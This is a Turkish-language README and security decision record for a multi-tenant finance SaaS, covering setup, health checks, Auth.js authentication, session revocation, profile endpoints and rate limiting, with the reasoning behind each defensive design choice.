# bireysel-kurumsal-finans
Kurumsal ve bireysel kullanıma yönelik; çok kiracılı (multi-tenant), faturalandırma, çek takibi, otomatik cron hatırlatıcıları, rol tabanlı erişim kontrolü ve kapsamlı Excel/CSV veri içe/dışa aktarma özelliklerine sahip bulut tabanlı finansal yönetim SaaS platformu.

Kanban: https://github.com/orgs/21072026/projects/2

## Geliştirme Rehberi

Bu README, ürün dokümantasyonunun yanı sıra bir **karar kaydıdır**: aşağıdaki bölümlerde her
güvenlik kararının gerekçesi ve kabul edilen kalan riski yazılıdır. Kod yazmadan önce ilgili
bölümü okuyun.

Katkı kuralları ayrı dosyalarda tutulur:

| Dosya | İçerik |
| --- | --- |
| [`docs/security-invariants.md`](docs/security-invariants.md) | Pazarlığa kapalı güvenlik kuralları ve nasıl zorlandıkları |
| [`docs/architecture.md`](docs/architecture.md) | Katmanlar, dizin haritası, route/servis anatomisi, yeni model ekleme |
| [`docs/conventions.md`](docs/conventions.md) | TypeScript, isimlendirme, yorum, Prisma ve hata yönetimi konvansiyonları |
| [`docs/testing.md`](docs/testing.md) | Üç test suite'i, ne nereye yazılır, bilinen tuzaklar |
| [`docs/workflow.md`](docs/workflow.md) | Branch, commit, PR ve Definition of Done |
| [`CLAUDE.md`](CLAUDE.md) / [`AGENTS.md`](AGENTS.md) | Kodlama ajanları için aynı kuralların özeti |

## Teknoloji Stack'i

- [Next.js](https://nextjs.org/) (App Router) + TypeScript
- [Tailwind CSS](https://tailwindcss.com/)
- [PostgreSQL](https://www.postgresql.org/) + [Prisma ORM](https://www.prisma.io/)
- [Auth.js](https://authjs.dev/) v5 (next-auth) — kayıt, giriş/çıkış, şifre sıfırlama, session revocation; RBAC ve tenant izolasyonu backend'de zorlanır (bkz. `docs/security-invariants.md`)
- Docker / Docker Compose (lokal PostgreSQL)
- [Playwright](https://playwright.dev/) (E2E testler)
- ESLint

## Prerequisites

- Node.js 20+ ve npm
- Docker Desktop (lokal PostgreSQL için)

## Environment Setup

Proje kökünde `.env.example` dosyasını `.env` olarak kopyalayın:

```bash
cp .env.example .env
```

`.env` dosyası Git'e girmez; gerçek secret içermeden sadece lokal geliştirme değerlerini tutar.

### Ortam Değişkenleri

| Değişken | Zorunlu | Açıklama |
| --- | --- | --- |
| `DATABASE_URL` | Her ortamda | PostgreSQL bağlantı adresi (Prisma). |
| `AUTH_SECRET` | Her ortamda | JWT session token'larını imzalar/şifreler. `npx auth secret` ile üretilir. |
| `APP_BASE_URL` | **Production'da** | Uygulamanın dışarıya görünen kök adresi. |
| `EMAIL_PROVIDER` | **Production'da** | `console` \| `resend`. Production'da `console` olamaz. |
| `EMAIL_API_KEY` | `resend` ise | Sağlayıcı API anahtarı. **Secret** — loglanmaz, `NEXT_PUBLIC_` olamaz. |
| `EMAIL_FROM` | `resend` ise | Gönderen adresi, ör. `FinansMax <no-reply@example.com>`. |
| `TRUSTED_PROXY` | **Production'da** | `true` \| `false`. `x-forwarded-for` güvenilir mi? Sessiz varsayılan YOK (Issue #182). |
| `RATE_LIMIT_STORE` | Hayır | `memory` (varsayılan) \| `redis`. Çok instance'lı deployment'ta `redis` gerekir (Issue #181). |
| `UPSTASH_REDIS_REST_URL` | `redis` ise | Upstash REST adresi. Eksikse uygulama sessizce `memory`'ye DÜŞMEZ, hata verir. |
| `UPSTASH_REDIS_REST_TOKEN` | `redis` ise | Upstash REST token'ı. **Secret** — loglanmaz, `NEXT_PUBLIC_` olamaz. |
| `SENTRY_DSN` | Hayır | Sentry hata izleme (Issue #183). Tanımsızsa SDK hiç başlatılmaz; loglama tam çalışır. |
| `POSTGRES_*` | Lokal | Yalnızca `docker-compose.yml`'in lokal PostgreSQL container'ını kurmak için. |

**`APP_BASE_URL` neden production'da zorunlu:** Şifre sıfırlama ve tenant daveti
**e-postalarındaki mutlak linkler** bu değerden üretilir. Değişken eskiden yoksa sessizce
`http://localhost:3000`'e düşüyordu — yani production'da gönderilen her reset/davet linki
çalışmıyor, üstelik hiçbir hata üretilmediği için bu fark edilmiyordu. Artık production'da
değişken yoksa (veya mutlak bir `http(s)` URL değilse) uygulama bilerek hata verir
(`src/lib/config/app-url.ts`).

Değer, e-posta gönderen akışlarda **herhangi bir DB erişiminden önce** çözülür. Bu bir detay
değil, gerekliliktir: aksi halde yanlış yapılandırılmış bir production'da "kayıtlı e-posta →
500, kayıtsız e-posta → 200" farkı oluşur ve Issue #7'de kapatılan user-enumeration oracle'ı
geri gelirdi. Regresyon testi: `integration/app-url.spec.ts`.

## PostgreSQL'i Docker ile Çalıştırma

```bash
docker compose up -d
```

Bu komut `.env` dosyasındaki `POSTGRES_*` değişkenlerini kullanarak lokal bir PostgreSQL container'ı ayağa kaldırır.

## Local Development

```bash
npm install
npm run prisma:migrate   # veritabanı şemasını uygular
npm run dev              # http://localhost:3000
```

## Prisma Komutları

```bash
npm run prisma:generate  # Prisma Client üretir
npm run prisma:migrate   # migration oluşturur/uygular (dev)
npm run prisma:studio    # Prisma Studio'yu açar
```

## Test Komutları

```bash
npm run lint              # ESLint
npm run typecheck         # TypeScript tip kontrolü
npm run build             # production build
npm run test:integration  # src/lib fonksiyonları, DB'ye karşı (tarayıcısız)
npm run test:security     # yetki / tenant izolasyonu / enumeration testleri
npm run test:e2e          # Playwright E2E (gerçek Chromium)
```

Üç test suite'inin ne zaman hangisinin kullanılacağı ve bilinen tuzaklar için
[`docs/testing.md`](docs/testing.md).

## Health Check

İki ayrı endpoint vardır ve bu ayrım bilinçlidir (Issue #184): **liveness** ("süreç ayakta mı")
ile **readiness** ("istek karşılayabilir mi") farklı sorulardır.

| Endpoint | Ne sorar | Kim kullanır |
| --- | --- | --- |
| `GET /api/health` | Süreç ayakta mı? | Load balancer / restart politikası |
| `GET /api/health/ready` | DB erişilebilir ve migration'lar uygulanmış mı? | Uptime izleme, trafik yönlendirme |

`GET /api/health` sabit `{ status: "ok", timestamp }` döner ve **DB'ye bakmaz** — davranışı
değişmedi.

`GET /api/health/ready` sağlıklıysa `200`, değilse `503` döner:

```json
{ "status": "ok", "checks": { "database": "ok", "migrations": "ok" } }
```

### Neden gerekliydi

Önceki tek endpoint sabit `{ status: "ok" }` dönüyordu: veritabanı düşmüş, migration
uygulanmamış veya bağlantı havuzu tükenmiş olsa bile **yine "ok" diyordu**. Yani load balancer
ve uptime izleme, gerçekte bozuk olan bir instance'a trafik göndermeye devam ediyordu.

### Neyi kontrol eder

- **Veritabanı:** `SELECT 1`. Ham SQL burada bilinçli bir istisnadır (`docs/conventions.md`):
  yoklanan şey bir Prisma modeli değil, bağlantının kendisidir. Bir model üzerinden `count()`
  yapmak reddedildi — o sorgu tabloya, index'e ve satır sayısına bağlıdır; ölçmek istediğimiz
  ise yalnızca bağlantının canlılığı.
- **Migration'lar:** iki ayrı arıza sınıfı. (1) yarım kalmış veya geri alınmış migration
  (`finished_at IS NULL` ya da `rolled_back_at IS NOT NULL`) — şema belirsiz durumdadır;
  (2) diskte olup DB'de kaydı olmayan migration — yani "yeni kod eski şemaya deploy edildi",
  en sık görülen ve en sessiz bozulma biçimi.

Migration dizini okunamıyorsa kontrol **başarısız** sayılır, "sorun yok" değil: bilmiyor olmak
iyi haber değildir.

### Kararlar

**2 saniyelik zaman aşımı, fail-closed.** Askıda kalan bir health check hiç olmamasından
kötüdür: bağlantı havuzu tükendiğinde `SELECT 1` dakikalarca bekleyebilir ve izleme sistemi
instance'ı ne sağlıklı ne sağlıksız sayar — trafik akmaya devam eder. Süre dolarsa kontrol
başarısızdır.

**503, 500 değil.** 500 endpoint'in kendisinin bozuk olduğunu ima ederdi; izleme sistemi
"uygulama bozuk" ile "health endpoint'i bozuk" durumlarını ayırt edemezdi.

**Kimlik doğrulaması yok, bu yüzden yanıt bilinçli olarak fakir.** İzleme sistemleri kimlik
taşıyamaz; endpoint internete açık olabilir. Bu yüzden yanıtta bağlantı dizesi, host, sürüm,
SQL veya stack trace **yoktur** — yalnızca kontrol adı ve `ok`/`fail` (invariant #7). Ayrıntı
sunucu logunda kalır. Regresyon bariyeri: `security/health-security.spec.ts` yanıtın alan
kümesini sabitler; yeni bir alan eklenirse kırmızıya döner.

**Rate limit yok ve bu gerekçelidir** (invariant #9 gerekçe yazılmasını ister): endpoint state
değiştirmez ve ucuzdur, yani #9'un hedeflediği "public veya pahalı state değiştiren" sınıfına
girmez. Dahası limit koymak zararlı olurdu — sağlık kontrolü 429 alan bir load balancer,
sağlıklı bir instance'ı ölü sayardı. Kötüye kullanım riski deployment tarafında (probe'u iç ağa
kısıtlayarak) ele alınır.

### Kapsam dışı

Bağımlı dış servislerin (e-posta sağlayıcısı, paylaşılan rate-limit store'u) sağlığı bu
kontrole **dahil değildir**; #180 ve #181 tamamlandıktan sonra ayrı bir issue ile eklenir.

## Authentication

Kimlik doğrulama altyapısı [Auth.js](https://authjs.dev/) v5 (`next-auth`) ile kurulmuştur (`src/lib/auth/`).

- **Session stratejisi: JWT.** Credentials provider Auth.js'te yalnızca JWT session stratejisiyle
  desteklenir (database-backed session ile çalışmaz); bu yüzden `session.strategy = "jwt"` seçildi.
  Bu seçim ayrıca `Account`/`Session`/`VerificationToken` Prisma modellerine ve bir DB adapter
  paketine ihtiyacı ortadan kaldırır.
- Şifreler Node'un yerleşik `crypto` modülü (`scrypt`) ile hash'lenir (`src/lib/auth/password.ts`);
  ek bir hashing paketi eklenmemiştir.
- `getCurrentUser()` (`src/lib/auth/current-user.ts`) sunucu tarafında mevcut oturumu okur;
  `requireUser()` (`src/lib/auth/guard.ts`) API route handler'larında kimlik doğrulamayı
  zorunlu kılan tekrar kullanılabilir bir guard'dır.
- `AUTH_SECRET` ortam değişkeni JWT'leri imzalamak için gereklidir. Lokal bir değer üretmek için:
  ```bash
  npx auth secret
  ```
- **Kayıt (sign-up):** `POST /api/auth/signup` (`{ email, password }`) e-posta + şifre ile yeni
  bir `User` oluşturur (`src/lib/auth/signup.ts`). Şifre `hashPassword` ile hash'lenir, e-posta
  normalize edilir (trim + lowercase) ve zaten kayıtlı bir e-postayla tekrar kayıt denemesi
  `409` ile reddedilir. Bu adım herhangi bir `Tenant`/`Membership` oluşturmaz.

  **User enumeration — bilinçli bir tercih (Issue #106):** Bu `409`, kimlik doğrulaması
  gerektirmeden "bu e-postanın hesabı var mı?" sorusunu yanıtlar; yani signup, sign-in ve
  forgot-password'ün AKSİNE enumeration'a karşı sertleştirilmemiştir. Bu bir gözden kaçma
  değil, gözden geçirilmiş bir karardır:

  - Sign-in ve forgot-password'de bilgiyi sızdırmak GEREKSİZDİR — kullanıcıya "e-posta yanlış"
    demek hiçbir işlevsel değer katmaz, o yüzden oralarda yanıt (ve sign-in'de hesaplama
    maliyeti) eşitlenmiştir.
  - Signup'ta ise durum terstir: meşru bir kullanıcının çok sık karşılaştığı senaryo "hesabım
    olduğunu unutmuşum"dur ve ona bunu doğrudan söylemek akışın işleyişi için gereklidir.
  - Bilgiyi gizlemenin tek doğru yolu ("aynı genel yanıtı dön, gerçek durumu e-posta ile
    bildir") ÇALIŞAN bir e-posta kanalı gerektirir. Bu repo'da gerçek bir sağlayıcı yoktur
    (`EmailSender` arkasında konsol/dosya tabanlı bir implementasyon vardır), dolayısıyla o
    yaklaşım production'da meşru kullanıcıyı "e-postanı kontrol et" deyip hiçbir şey
    göndermeyen bir çıkmaza sokardı — sızıntıdan daha büyük bir zarar.

  Sızıntı, signup rate limit'i (IP başına 5/10dk, bkz. "Rate Limiting") ile sınırlanır ama
  ortadan KALKMAZ. Gerçek bir e-posta sağlayıcısı entegre edildiğinde bu karar yeniden
  değerlendirilmelidir.
- **Giriş (sign-in) / Çıkış (sign-out):** Credentials provider'ın `authorize` fonksiyonu
  (`src/lib/auth/authenticate.ts`) e-posta + şifreyi mevcut `verifyPassword`'a karşı doğrular.
  Giriş, Auth.js'in kendi `/api/auth/callback/credentials` endpoint'i üzerinden yapılır; çıkış
  için yine Auth.js'in kendi `/api/auth/signout` endpoint'i kullanılır (her ikisi de
  `src/app/api/auth/[...nextauth]/route.ts`'teki mevcut catch-all handler'dan otomatik
  sağlanır, ek route eklenmemiştir). Bilinmeyen e-posta ile yanlış şifre AYNI genel hatayı
  verir ve aynı hesaplama maliyetine sahiptir (user enumeration / timing side-channel'a karşı).
  **Session süresi: 8 saat.** Finansal bir SaaS için Auth.js'in varsayılan 30 günlük JWT
  ömrü fazla geniş olduğundan `session.maxAge` 8 saate düşürüldü (`src/lib/auth/config.ts`).
  **Mimari not:** Stateless JWT session kullanıldığı için sign-out sadece istemcinin cookie'sini
  temizler; sign-out'tan önce yakalanmış bir JWT, kendi `exp`'ine (artık en fazla 8 saat) kadar
  teorik olarak hâlâ geçerlidir — sunucu tarafında bir revocation listesi yoktur ve bu bilinçli
  olarak ayrı bir issue'ya bırakılmıştır (bkz. `security/signin-signout-security.spec.ts`).
- **Şifre sıfırlama:** `POST /api/auth/forgot-password` (`{ email }`) ve `POST /api/auth/reset-password`
  (`{ token, password }`) (`src/lib/auth/password-reset.ts`). Reset token'ı `crypto.randomBytes(32)`
  (256 bit) ile üretilir; DB'de (`PasswordResetToken.tokenHash`) SADECE SHA-256 hash'i saklanır,
  raw token hiçbir zaman saklanmaz. Token 30 dakika sonra geçersiz olur ve tek kullanımlıktır —
  tüketim, race condition'a kapalı tek bir atomik `updateMany` (`WHERE tokenHash = ? AND usedAt
  IS NULL AND expiresAt > now()`) ile yapılır. `forgot-password`, kayıtlı/kayıtsız e-posta için
  her zaman aynı genel mesajı döner (user enumeration engeli). Gerçek e-posta gönderimi kapsam
  dışıdır; `EmailSender` interface'i (`src/lib/auth/email.ts`) arkasında, production'da gerçek
  bir sağlayıcıyla değiştirilebilecek minimal bir konsol/dosya tabanlı implementasyon kullanılır.
  **Raw token production loglarına yazılmaz:** `consoleEmailSender` production'da yalnızca
  alıcıyı loglar, `resetUrl`'i (dolayısıyla raw token'ı) loglamaz — aksi halde log erişimi olan
  biri, son 30 dakika içinde reset talebinde bulunmuş herhangi bir hesabı devralabilirdi
  (regresyon testi: `integration/email-sender-logging.spec.ts`).
  Reset sonrası, reset'ten önce üretilmiş JWT session'ları artık otomatik iptal edilir — bkz.
  aşağıdaki "Session Revocation".
- **Şifre değiştirme (authenticated):** `POST /api/auth/change-password`
  (`{ currentPassword, newPassword }`) (`src/lib/auth/change-password.ts`, Issue #33). "Şifremi
  unuttum" akışından (#7) farklıdır: buradaki kanıt bir e-posta token'ı değil, kullanıcının
  MEVCUT şifresidir.

  - **Neden mevcut şifre doğrulanır:** Session cookie'si çalınmış bir saldırgan, bu adım
    olmadan şifreyi değiştirip hesabı kalıcı olarak devralabilirdi. Bu kontrol, session
    hırsızlığı ile tam hesap devralma arasındaki adımı kapatır (regresyon testi:
    `security/change-password-security.spec.ts` → "geçerli session + YANLIŞ mevcut şifre").
  - **Kontrol sırası:** Önce mevcut şifre doğrulanır, SONRA yeni şifre politikası kontrol
    edilir — mevcut şifresini kanıtlayamayan bir çağrıya hiçbir ek geri bildirim verilmez.
    (Password reset'te sıra terstir: orada erken doğrulama, tek kullanımlık token'ın zayıf bir
    şifre yüzünden boşa yanmasını engeller; burada yakılacak token yoktur.)
  - **Bilgi sızdırmama:** Yanlış şifre / eksik-boş girdi / şifresiz hesap (`passwordHash` null,
    ileride OAuth ile oluşturulmuş hesaplar) durumlarının HEPSİ aynı `401` ve aynı genel mesajı
    döner. Şifresiz bir hesaba bu akışla şifre BELİRLENEMEZ — doğrulanacak mevcut şifre yoktur.
  - **Yan etkisizlik:** Mevcut şifre yanlışsa veya yeni şifre politikaya takılıyorsa hiçbir
    yazma yapılmaz; özellikle `credentialsChangedAt` bumplanmaz. Aksi halde geçersiz bir istek,
    kullanıcının tüm oturumlarını düşürebilirdi.
  - **Audit:** Başarılı değişiklik `AUTH_PASSWORD_CHANGED`, başarısız deneme
    `AUTH_PASSWORD_CHANGE_FAILURE` olarak kaydedilir. Login failure'ın AKSİNE burada
    `actorUserId` doldurulur (istek zaten authenticated'dır, enumeration sinyali taşımaz); bir
    hesapta arka arkaya gelen failure kaydı, çalınmış session ile şifre tahmini girişiminin en
    doğrudan göstergesidir.
  - **Eşzamanlılık:** "Oku → scrypt ile doğrula → yaz" arasında teorik bir TOCTOU penceresi
    vardır (scrypt doğrulaması SQL'e indirgenemez). Bilinçli olarak kabul edilmiştir: bu
    pencereyi kullanabilecek tek senaryo eşzamanlı bir password reset veya ikinci bir
    change-password isteğidir; her ikisi de zaten hesap sahibinin kendi yetkisiyle yaptığı
    meşru credential değişiklikleridir, sonuç "son yazan kazanır" olur ve yetki yükselmesi
    doğmaz. Pahalı scrypt çağrısını bir DB transaction'ı içinde tutmak bu nedenle gereksiz
    maliyet olurdu.
  - **⚠️ Kullanıcı kendi oturumundan da düşer:** Değişiklik `credentialsChangedAt`'i bumpladığı
    için, isteği yapan kullanıcının KENDİ session'ı da geçersizleşir ve yeniden giriş yapması
    gerekir. Stateless JWT mimarisinde "bu isteği yapan token"ı ayrıcalıklı kılmanın bir yolu
    yoktur (sunucu tarafında token kaydı tutulmadığından, tek tek token'lar birbirinden ayırt
    edilemez); "diğer tüm oturumları kapat ama bunu açık tut" davranışı ancak session store
    eklenirse mümkün olur. Yanıt mesajı bu yüzden açıkça "Please sign in again." der.
  - **Kapsam dışı (bilinçli):** "Yeni şifre eskisiyle aynı olamaz" kuralı bu issue'nun kabul
    kriterlerinde yoktur ve eklenmemiştir; gerekirse ayrı bir issue ile değerlendirilir.
- **Kapsam dışı:** Route/endpoint bazlı yetkilendirme (RBAC) ve tenant seçimi ayrı issue'ların
  kapsamındadır.

### Session Revocation (Issue #26)

Kritik bir credential (şifre) değişikliğinden ÖNCE üretilmiş JWT session'ları, sonraki istekte
otomatik olarak geçersiz sayılır. Database session / refresh token / blacklist YOKTUR —
stateless Auth.js JWT mimarisi korunur.

- **Nasıl çalışır:** `User.credentialsChangedAt` (nullable `DateTime`) her şifre değişikliğinde
  güncellenir (`src/lib/auth/credentials.ts`'teki `updateUserPassword()` — passwordHash ile AYNI
  UPDATE ifadesinde, atomik olarak). Auth.js'in **`jwt` callback'i** (`src/lib/auth/config.ts`)
  her istekte, `token.sub` ile TEK bir DB sorgusu yapıp `credentialsChangedAt`'i okur ve
  `token.iat` (JWT üretim zamanı) ile karşılaştırır (`isSessionRevoked()`,
  `src/lib/auth/session-revocation.ts`). Revoke edilmişse callback `null` döner.
- **Kontrol neden `jwt` callback'inde (ve `session` callback'inde DEĞİL):** Auth.js'in session
  action'ı `GET /api/auth/session` isteğinde token'ı **her zaman yeniden imzalar** ("Refresh JWT
  expiry by re-signing it") ve tazelenmiş cookie'yi response'a ekler; yeni token TAZE bir `iat`
  alır. `session` callback'i yalnızca response GÖVDESİNİ şekillendirdiği için bu yeniden
  imzalamayı engelleyemez — kontrol orada yapılsaydı, çalınmış bir reset-öncesi cookie tek bir
  `GET /api/auth/session` çağrısıyla tazelenip tekrar geçerli hale gelir ve revocation tamamen
  bypass edilirdi (üstelik `exp` de ilerlediği için token süresiz yenilenebilirdi). `jwt`
  callback'i `null` döndüğünde ise Auth.js token'ı yeniden imzalamak yerine session cookie'sini
  TEMİZLER ve gövdeyi `null` bırakır — bu yüzden revoke kararı orada verilir. Regresyon testi:
  `security/session-revocation-security.spec.ts` içindeki "GET /api/auth/session üzerinden
  bypass edilemez" bloğu.
- **Precision:** JWT `iat` Unix SANİYE hassasiyetinde, `credentialsChangedAt` ise milisaniye
  hassasiyetindedir. Yanlışlıkla yeni (geçerli) bir session'ı revoke etmemek için, bir token'ın
  `iat` saniyesinin TAMAMI hâlâ geçerli kabul edilir — sadece `credentialsChangedAt`, o saniye
  tamamen bittikten SONRA ise revoke edilir (en fazla ~1 saniyelik bilinçli bir "grace window").
- **Revoke edilen bir session için** `getCurrentUser()` yine `null`, `GET /api/auth/me` yine
  `401` döner — public contract değişmez, `500`/exception üretilmez.
- **Migration güvenliği:** `credentialsChangedAt` nullable'dır; `null` = hiç credential
  değiştirilmedi, hiçbir session revoke edilmez (mevcut kullanıcılar migration sonrası
  etkilenmez).
- **Rol/membership değişiklikleri bu mekanizmayı TETİKLEMEZ** — sadece credential (şifre)
  değişiklikleri.
- **Şifre değiştiren tüm akışlar bu mekanizmaya bağlıdır:** Password reset (#7) ve authenticated
  password change (#33) — her ikisi de `updateUserPassword()` üzerinden yazar, dolayısıyla ikisi
  de session revocation'ı tetikler. Şifre hash'ini değiştiren yeni bir akış eklenirse kendi
  `prisma.user.update()` çağrısını YAZMAMALI, aynı fonksiyonu kullanmalıdır; aksi halde
  `credentialsChangedAt` bumplanmaz ve revocation o akış için sessizce devre dışı kalır.

### JWT'deki ad profil güncellemesiyle senkron (Issue #113)

`PATCH /api/users/me` ile ad değiştirildikten sonra iki endpoint AYNI soruya farklı cevap
veriyordu: `GET /api/users/me` güncel adı (DB'den), `GET /api/auth/me` eski adı (JWT'den).
`token.name` sign-in anında sabitleniyor ve bir sonraki girişe kadar tazelenmiyordu; kullanıcı
adını değiştirdikten sonra arayüzde eski adını görmeye devam ediyordu.

- **Düzeltme, mevcut sorgunun `select`'ine bir alan eklemekten ibaret.** `jwt` callback'i zaten
  her istekte `credentialsChangedAt` için tek bir satır okuyor; aynı sorguya `name` eklendi ve
  `token.name` güncelleniyor. **Ek DB maliyeti yoktur** — bu, davranışla gösterilemeyecek
  yapısal bir iddia olduğu için `integration/auth-config.spec.ts` callback gövdesini okuyup tek
  bir `prisma` çağrısı olduğunu doğrulayan bir kaynak-metni testi taşıyor
  (`get-side-effect-free-pattern.spec.ts` ile aynı yaklaşım).
- **Ad, revocation kararından SONRA yazılır.** Sıra kayda değer: `jwt` callback'i session
  revocation'ın kritik kod yoludur ve `null` dönüşü tüm mekanizmayı taşır. Revoke edilecek bir
  token'a hiç dokunulmaması, ileride bu bloğa eklenecek her şeyin doğru tarafta kalmasını
  sağlar. Test bunu ayrıca doğrular: adı değişmiş AMA revoke edilmiş bir token yine `null`
  döner ve `GET /api/auth/me` yine `401` verir.
- **Kullanıcı satırı yoksa ad da güncellenmez.** Silinmiş kullanıcının token'ı bugün revoke
  edilmiyor (#26'nın kayda geçmiş kapsam notu); `token.name`'i `undefined`a çekmek o davranışı
  sessizce değiştirirdi.
- **Yeniden giriş gerekmez.** Auth.js `session.user`ı `callbacks.jwt` döndükten SONRA token'dan
  kurar ve token'ı yeniden imzalar (`node_modules/@auth/core/lib/actions/session.js`), yani
  güncelleme hem yanıta hem tazelenen cookie'ye yansır.

Kanıt: `integration/auth-config.spec.ts` (callback kararı ve sorgu bütçesi) +
`security/user-profile-security.spec.ts` (uçtan uca: güncelleme öncesi kontrol grubu, iki
endpoint'in aynı adı döndürmesi, revocation'ın baypas edilmemesi).

## Kullanıcı Profili (Issue #31)

Authenticated kullanıcının kendi profilini görüntüleyip güncellemesi
(`src/lib/users/`, `src/app/api/users/me/route.ts`).

- **`GET /api/users/me`** → `{ user: { id, email, name, createdAt } }`.
- **`PATCH /api/users/me`** `{ name }` → güncellenmiş profili aynı biçimde döner.

Notlar:

- **Hangi kullanıcı?** Sorunun tek cevabı trusted session'dır (`requireUser()` → `user.id`).
  Endpoint başka bir kullanıcıyı hedefleyecek parametre KABUL ETMEZ; body'deki `userId`/`email`
  okunmaz bile.
- **Güncellenebilir tek alan `name`'dir** ve bu kısıtlama filtreleme ile değil YAPISAL olarak
  sağlanır: servis, gelen `input` nesnesini Prisma'ya geçirmez; yalnızca doğruladığı `name`
  değerini açıkça yazar. Body'ye `email`/`passwordHash`/`credentialsChangedAt` eklemek hiçbir
  etki yaratmaz (regresyon testi: `security/user-profile-security.spec.ts` → "body'deki ekstra
  alanlar YOK SAYILIR").
- **E-posta bu endpoint'ten değiştirilemez:** hem giriş kimliği hem `@unique` olduğu için
  değişimi yeni adrese onay maili gerektirir — ayrı bir issue'nun konusudur.
- **Yanıt alan allowlist'i dardır** (`profileSelect`): `passwordHash`, `credentialsChangedAt`,
  `emailVerified` yanıta ASLA girmez. Yeni bir alan eklenmeden önce "bu bilgi client'a gitmeli
  mi?" sorusu yanıtlanmalıdır.
- **Doğrulama:** `name` trim'lenir ve 2–100 karakter olmalıdır (`src/lib/users/validation.ts`).
  Uzunluk kontrolü trim SONRASI yapılır — aksi halde yalnızca boşluktan oluşan bir girdi geçerdi.
  Karakter kümesi bilinçli olarak kısıtlanmaz: isimler uluslararasıdır ve regex ile "geçerli
  isim" tanımlamaya çalışmak meşru kullanıcıları dışlar.
- **`/api/auth/me` ile farkı:** `/api/auth/me` oturumun (JWT'nin) içeriğini yansıtır;
  `/api/users/me` veritabanının güncel halini döner. ⚠️ **Bilinen tutarsızlık:** JWT'deki `name`
  sign-in anında sabitlendiği için, profil güncellendikten sonra `/api/auth/me` bir sonraki
  girişe kadar ESKİ adı göstermeye devam eder. Bu, bu issue'nun kapsamı dışında bırakıldı;
  çözümü, `jwt` callback'inin zaten her istekte yaptığı DB sorgusuna `name`'i eklemek olurdu
  (bkz. `src/lib/auth/config.ts`) — session revocation yolunu etkilediği için ayrı bir issue
  ile ele alınmalıdır.
- **Rate limit yoktur (bilinçli):** Endpoint authenticated'dır, credential doğrulamaz veya
  değiştirmez, e-posta göndermez ve pahalı bir hesaplama yapmaz — yani `change-password`'ün
  aksine burada brute-force edilebilecek bir sır yoktur. Gelecekte kötüye kullanım görülürse
  mevcut `checkRateLimit()` ile tek satırda eklenebilir.
- **Audit log yazılmaz (bilinçli):** İsim değişikliği güvenlik açısından kritik bir olay
  değildir; audit kataloğu (`src/lib/audit/actions.ts`) auth/tenant/membership olaylarına
  odaklıdır. Profil alanları hassaslaşırsa (ör. e-posta değişimi eklenirse) bu yeniden
  değerlendirilmelidir.

## Rate Limiting (Issue #27)

Auth ve tenant-creation endpoint'leri, brute-force / otomatik spam trafiğine karşı IP + endpoint
bazlı bir sliding-window rate limiter ile korunur (`src/lib/rate-limit/`).

- **Korunan endpoint'ler ve limitler** (`src/lib/rate-limit/policies.ts` — tek kaynak, magic
  number route'lara dağıtılmaz):

  | Endpoint | Limit | Bucket prefix |
  | --- | --- | --- |
  | `POST /api/auth/callback/credentials` (sign-in) | 10 / 5 dk | `auth:sign-in` |
  | `POST /api/auth/signup` | 5 / 10 dk | `auth:sign-up` |
  | `POST /api/auth/forgot-password` | 5 / 15 dk | `auth:forgot-password` |
  | `POST /api/auth/reset-password` | 10 / 15 dk | `auth:reset-password` |
  | `POST /api/auth/change-password` | 10 / 15 dk | `auth:change-password` |
  | `POST /api/tenants` (tenant oluşturma) | 10 / 10 dk | `tenant:create` |

  `change-password`, listedeki tek **authenticated** credential-değiştirme endpoint'idir; limiti
  yine de authentication'dan ÖNCE uygulanır, çünkü korunmak istenen tehdit "çalınmış bir session
  cookie'siyle mevcut şifreyi online brute-force etmek"tir (bkz. Issue #33). Limit IP bazlıdır
  (kullanıcı bazlı değil) — mevcut `checkRateLimit()` sözleşmesiyle tutarlı kalmak için; kullanıcı
  bazlı bir bucket gerekirse ayrı bir issue ile eklenmelidir.

- **Kullanım:** `checkRateLimit(request, bucket, policy)` (`src/lib/rate-limit/guard.ts`) mevcut
  `requireUser()` / `requirePermission()` guard'larıyla AYNI deseni izler: limit aşılmışsa hazır
  bir `NextResponse` (429), aşılmamışsa `null` döner. Kontrol her zaman business logic'ten
  (body parse, DB erişimi, `requireUser()` dahil) ÖNCE yapılır — 429 durumunda hiçbir side-effect
  tetiklenmez.
- **429 response'u:** Sabit, bilgi sızdırmayan bir gövde (`{ "error": "Too many requests. Please
  try again later." }`) ve saniye cinsinden bir `Retry-After` header'ı döner. IP, bucket key,
  kullanıcı kimliği veya deneme sayısı response'a ASLA yazılmaz.
- **Sliding window (fixed window DEĞİL):** Her `consume()` çağrısında "şu andan `windowMs`
  öncesine kadar" olan pencere yeniden değerlendirilir; pencere sınırında ani bir reset yoktur.
  Reddedilen denemeler bucket'a kaydedilmez — yani başarısız istekler kotayı tüketmez ve pencereyi
  uzatmaz.
- **Concurrency:** `InMemoryRateLimiter.consume()` içinde hiç `await` yoktur; okuma + hesaplama +
  yazma tek senkron blokta yapıldığı için tek process içinde atomiktir (aynı key'e eşzamanlı
  `Promise.all` istekleri limiti bypass edemez).
- **Bellek:** Bucket başına timestamp sayısı kendi `limit`'i ile sınırlıdır; boşalan bucket'lar
  Map'ten silinir ve `maxTrackedBuckets` (varsayılan 10.000) eşiği aşılınca gerçek bir `consume()`
  çağrısına "binen" lazy bir sweep tamamen expire olmuş bucket'ları temizler. Background
  worker/timer kurulmaz.
- **Sign-in neden route seviyesinde?** Auth.js Credentials provider'ının `authorize()` callback'i
  yalnızca `User | null` döndürebilir; özel bir 429 status'u veya `Retry-After` header'ı
  üretemez. Bu yüzden sign-in limiti, NextAuth yapılandırmasına hiç dokunmadan, credentials
  callback POST'u `handlers.POST`'a devredilmeden ÖNCE
  (`src/app/api/auth/[...nextauth]/route.ts`) uygulanır — pahalı scrypt doğrulaması hiç
  çalışmaz. Diğer auth action'ları (signout, csrf, vb.) etkilenmez.
- **User enumeration:** `forgot-password` limiti yalnızca IP + endpoint'e bakar, e-postaya hiç
  bakmaz; kayıtlı/kayıtsız e-posta arasında davranış farkı yaratmaz (Issue #7 koruması korunur).
- **Proxy trust artık bir varsayım değil, bir yapılandırma (Issue #182):** İstemci IP'si
  `x-forwarded-for`'un İLK segmentinden okunur (`src/lib/rate-limit/request-key.ts`), ama
  **yalnızca `TRUSTED_PROXY=true` ise**. Ayrıntı ve deployment gereklilikleri:
  [`docs/deployment.md`](docs/deployment.md). Header eksik, geçersiz biçimli veya
  `TRUSTED_PROXY=false` ise tüm bu istekler ortak bir `unknown` bucket'ını paylaşır — IP
  bulunamaması limiter'ı bypass ETMEZ.
